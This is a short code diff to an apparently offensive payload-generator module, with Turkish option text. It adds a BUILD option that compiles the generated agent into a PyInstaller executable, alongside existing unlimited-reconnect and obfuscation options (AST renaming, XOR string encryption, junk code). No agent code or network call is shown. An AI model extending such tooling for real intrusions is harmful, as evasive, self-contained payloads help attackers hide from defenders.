@@ -48,6 +48,7 @@ class Payload(BaseModule):
             "MAX_RECONNECT":   Option("MAX_RECONNECT",   -1,          False, "Maksimum bağlanma denemesi (-1 = sınırsız)."),
             "STRIP_COMMENTS":  Option("STRIP_COMMENTS",  False,       False, "Yorum satırlarını temizle.", choices=[True, False]),
             "OBFUSCATE":       Option("OBFUSCATE",       False,       False, "AST rename + XOR string şifreleme + junk code uygula.", choices=[True, False]),
+            "BUILD":           Option("BUILD",           False,       False, "PyInstaller ile çalıştırılabilir ikili (binary) dosyaya dönüştür.", choices=[True, False]),
         }
 
     def _to_bool(self, val) -> bool:
@@ -74,6 +75,7 @@ class Payload(BaseModule):
         max_reconnect   = int(self.Options["MAX_RECONNECT"].value or -1)
         strip_comments  = self._to_bool(self.Options["STRIP_COMMENTS"].value)
         obfuscate       = self._to_bool(self.Options["OBFUSCATE"].value)
+        build_bin       = self._to_bool(self.Options["BUILD"].value)
 
         agent_path = os.path.join(
             os.path.dirname(os.path.abspath(__file__)),
@@ -96,6 +98,7 @@ class Payload(BaseModule):
             agent_source_path=agent_path,
             strip_comments=strip_comments,
             obfuscate=obfuscate,
+            build_bin=build_bin,
             quiet=quiet,
         )
 
